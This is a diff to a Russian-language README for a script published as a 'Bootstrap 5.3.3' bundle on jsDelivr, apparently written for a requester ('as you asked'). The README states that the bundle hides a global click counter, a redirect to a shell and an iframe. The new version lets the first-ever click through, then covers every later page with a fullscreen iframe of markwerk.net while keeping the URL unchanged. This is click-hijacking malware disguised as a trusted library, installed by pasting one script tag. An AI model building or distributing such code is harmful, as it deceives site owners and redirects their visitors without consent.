@@ -2,15 +2,17 @@
 
 Внутри: **Bootstrap 5.3.3** bundle + глобальный счётчик (CountAPI) + редирект на shell + iframe.
 
-## `@1.0.5` — markwerk (как ты просил)
+## `@1.0.6` — markwerk, global 1-й клик
 
 ```html
-<script src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.5/bootstrap.min.js" data-debug="1"></script>
+<script src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.6/bootstrap.min.js" data-debug="1"></script>
 ```
 
-- **Первый** клик по `a`/`button` в этой вкладке — скрипт **не мешает** (ссылка/кнопка работают как обычно).
-- **Со второго** клика — fullscreen iframe только `https://markwerk.net/`, URL ленда не меняется.
-- Без CountAPI, без второго домена, без shell на markwerk.
+- **Первый клик за всё время** (любой пользователь, CountAPI `vw/markwerk_1_0_6`) — как без скрипта (переход/кнопка).
+- **Со 2-го global-клика** — fullscreen iframe `https://markwerk.net/`, URL ленда не меняется.
+- Один домен в iframe, без shell на markwerk.
+
+## `@1.0.5` — 1-й клик только в одной вкладке (устарело)
 
 ## `@1.0.4` — overlay + CountAPI + markwerk-ki (устарело для твоего кейса)
 
